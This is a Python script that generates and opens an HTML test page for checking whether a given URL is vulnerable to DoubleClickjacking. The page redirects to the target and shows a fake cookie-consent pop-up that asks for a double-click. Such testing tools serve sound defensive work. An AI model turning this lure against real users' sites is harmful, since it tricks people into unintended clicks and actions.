import os
import sys
import webbrowser

if len(sys.argv) != 2:
    print('\n[+] Description: %s verifies if a web page is vulnerable to DoubleClickjacking' % __file__)
    print('[+] Usage: python %s <url>\n' % __file__)
    exit(0)

url = sys.argv[1]

html = f'''
<html>
    <head>
        <title>DoubleClickjacking Test</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                text-align: center;
                margin: 0;
                padding: 0;
            }}
            .container {{
                margin-top: 50px;
            }}
            .log {{
                margin-top: 20px;
                font-family: monospace;
                text-align: left;
                display: inline-block;
                padding: 10px;
                border: 1px solid #ccc;
                width: 80%;
                background-color: #f9f9f9;
            }}
            #start-button {{
                font-size: 20px;
                padding: 10px 20px;
                background-color: #007bff;
                color: white;
                border: none;
                border-radius: 5px;
                cursor: pointer;
            }}
            #start-button:hover {{
                background-color: #0056b3;
            }}
        </style>
        <script>
            function logAction(message) {{
                const logDiv = document.getElementById('log');
                const timestamp = new Date().toLocaleTimeString();
                const logMessage = `[${{timestamp}}] ${{message}}`;
                logDiv.innerHTML += logMessage + '<br>';

                // Store the log in localStorage
                const existingLog = localStorage.getItem('attackLog') || '';
                localStorage.setItem('attackLog', existingLog + logMessage + '\\n');
            }}

            function restoreLog() {{
                const logDiv = document.getElementById('log');
                const storedLog = localStorage.getItem('attackLog');
                if (storedLog) {{
                    logDiv.innerHTML = storedLog.replace(/\\n/g, '<br>');
                }}
            }}

            function startAttack() {{
                logAction("Test started. Redirecting parent page to target page...");
                window.location = '{url}';

                logAction("Opening simulated cookie consent pop-up...");
                // Open a simulated cookie consent pop-up
                const attackerWindow = window.open('', 'attackerWindow', 'width=400,height=300');
                attackerWindow.document.write(`
                    <html>
                    <head>
                        <title>Cookie Consent</title>
                        <style>
                            body {{
                                font-family: Arial, sans-serif;
                                text-align: center;
                                padding-top: 100px;
                                margin: 0;
                                background-color: #f9f9f9;
                            }}
                            button {{
                                font-size: 16px;
                                margin: 10px;
                                padding: 10px 20px;
                                color: white;
                                background-color: #007bff;
                                border: none;
                                border-radius: 5px;
                                cursor: pointer;
                            }}
                            button:hover {{
                                background-color: #0056b3;
                            }}
                        </style>
                    </head>
                    <body>
                        <h2>Cookie Consent</h2>
                        <p>Double-click "Accept Cookies" to continue.</p>
                        <button onclick="
                            try {{
                                if (window.opener) {{
                                    // window.opener.logAction('User double-clicked Accept Cookies. Redirecting parent window to the target page...');
                                    window.close();
                                }}
                            }} catch (e) {{
                                alert('Error: Unable to communicate with parent window.');
                            }}
                            window.close();
                        ">Accept Cookies</button>
                        <button onclick="window.close()">Decline Cookies</button>
                    </body>
                    </html>
                `);

                logAction("Pop-up launched. Waiting for user interaction...");
            }}

            window.onload = restoreLog;
        </script>
    </head>
    <body>
        <div class="container">
            <h1>DoubleClickjacking Test</h1>
            <button id="start-button" onclick="startAttack()">Start DoubleClickjacking Test</button>
            <div id="log" class="log">
                <strong>Attack Flow Log:</strong><br>
            </div>
        </div>
    </body>
</html>
'''

test_file = os.path.abspath('doubleclickjack-test.html')
localurl = 'file://' + test_file

# Write the HTML file
with open(test_file, 'w') as f:
    f.write(html)

# Open the test page in the default web browser
webbrowser.open(localurl)

print('\n[+] Test file created:')
print(f'[+] {test_file}')
print('[+] Opening test page in your browser...')
print('\n[+] Test Complete!')





